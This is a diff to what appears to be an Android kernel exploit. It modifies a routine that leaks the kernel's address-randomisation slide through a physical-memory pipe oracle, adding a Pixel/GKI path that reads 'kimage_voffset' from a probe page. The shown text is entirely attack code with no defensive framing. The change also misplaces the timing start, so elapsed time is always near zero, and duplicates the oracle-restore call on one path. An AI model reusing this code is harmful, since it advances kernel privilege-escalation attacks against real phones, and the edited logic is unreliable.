@@ -695,7 +695,6 @@ int app_trigger_fops_slide_route(void) {
 }
 
 static int slide_leak_physical_base(void) {
-  size_t started = gettime_ns();
   if (!prepare_p0_pipe_oracle()) {
     pr_error("p0 physical pipe preparation failed\n");
     return 0;
@@ -723,6 +722,23 @@ static int slide_leak_physical_base(void) {
     slide_restore_physical_oracle();
     return 0;
   }
+#if defined(P0_SLIDE_VIA_GLOBAL) && P0_SLIDE_VIA_GLOBAL
+  /* Pixel/GKI: the probe page is the STATIC linear alias of the image
+   * page holding `kimage_voffset`.  Read the global's runtime value and
+   * derive the VA slide:
+   *   kimage_voffset = slid_kernel_base - __pa(KERNEL_START)
+   *   slide = kimage_voffset - (KIMAGE_TEXT_BASE - P0_KERNEL_PHYS_LOAD) */
+  uint64_t kvo = scan_p0_global_slide();
+  if (kvo == 0) {
+    pr_error("p0 global slide scan failed\n");
+    slide_restore_physical_oracle();
+    return 0;
+  }
+  uintptr_t va_slide =
+      (uintptr_t)(kvo - (KIMAGE_TEXT_BASE - P0_KERNEL_PHYS_LOAD));
+  pr_info("p0 kimage_voffset=%016llx -> va_slide=%08zx\n",
+          (unsigned long long)kvo, va_slide);
+#else
   uintptr_t offset = scan_p0_pipe_oracle();
   if (offset == (uintptr_t)-1) {
     slide_restore_physical_oracle();
@@ -731,7 +747,9 @@ static int slide_leak_physical_base(void) {
   if (!slide_restore_physical_oracle()) {
     return 0;
   }
-  size_t elapsed_ms = (size_t)((gettime_ns() - started) / 1000000ULL);
+  size_t started = gettime_ns();
+  size_t elapsed_ms =
+      (size_t)((gettime_ns() - started) / 1000000ULL);
   pr_success("p0 physical elapsed_ms=%zu\n", elapsed_ms);
   /* The fingerprint scan returns X = the ELF offset found at the FIXED
    * probe phys page.  The kernel image is physically loaded at
@@ -740,6 +758,10 @@ static int slide_leak_physical_base(void) {
   uintptr_t va_slide = P0_ORACLE_PROBE_OFFSET - offset;
   pr_info("p0 fingerprint offset=%08zx -> va_slide=%08zx\n",
           offset, va_slide);
+#endif
+  if (!slide_restore_physical_oracle()) {
+    return 0;
+  }
   return slide_commit_stext(KIMAGE_TEXT_BASE + va_slide, "physical");
 }
 
@@ -750,7 +772,7 @@ static int slide_commit_stext(uint64_t stext, const char *source) {
     return 0;
   }
   uint64_t slide = stext - KIMAGE_TEXT_BASE;
-  if (slide > 0x1f0000ULL || (slide & 0xffffULL) != 0) {
+  if (slide > SLIDE_MAX_VA_SLIDE || (slide & 0xffffULL) != 0) {
     pr_warning("slide rejected source=%s stext=%016llx slide=%016llx\n",
                source, (unsigned long long)stext,
                (unsigned long long)slide);
@@ -780,8 +802,8 @@ int slide_leak_kernel_base(void) {
     char *end = NULL;
     errno = 0;
     unsigned long long value = strtoull(forced_offset_arg, &end, 0);
-    if (errno || end == forced_offset_arg || *end || value > 0x1f0000ULL ||
-        (value & 0xffffULL) != 0) {
+    if (errno || end == forced_offset_arg || *end ||
+        value > SLIDE_MAX_VA_SLIDE || (value & 0xffffULL) != 0) {
       pr_error("slide invalid forced p0 offset=%s\n", forced_offset_arg);
       return 0;
     }
@@ -815,8 +837,8 @@ int slide_leak_kernel_base(void) {
     char *end = NULL;
     errno = 0;
     unsigned long long value = strtoull(forced_offset_arg, &end, 0);
-    if (errno || end == forced_offset_arg || *end || value > 0x1f0000ULL ||
-        (value & 0xffffULL) != 0) {
+    if (errno || end == forced_offset_arg || *end ||
+        value > SLIDE_MAX_VA_SLIDE || (value & 0xffffULL) != 0) {
       pr_error("slide invalid forced p0 offset=%s\n", forced_offset_arg);
       return 0;
     }
